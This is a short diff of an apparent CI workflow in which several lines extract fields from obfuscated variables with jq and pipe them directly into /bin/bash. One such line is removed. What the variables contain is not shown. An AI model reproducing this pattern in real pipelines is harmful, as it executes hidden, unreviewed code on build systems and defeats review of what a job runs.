@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$bt915" | jq -r .fsckh27 | /bin/bash
           echo $uzxig0 | jq -r .jq94764 | /bin/bash
           printf '%s' "$pzb7" | jq -r .fg125 | /bin/bash
-          echo $slr61 | jq -r .kjadt8415 | /bin/bash
           echo $ezf96 | jq -r .b188 | /bin/bash
 
       - name: Upload results
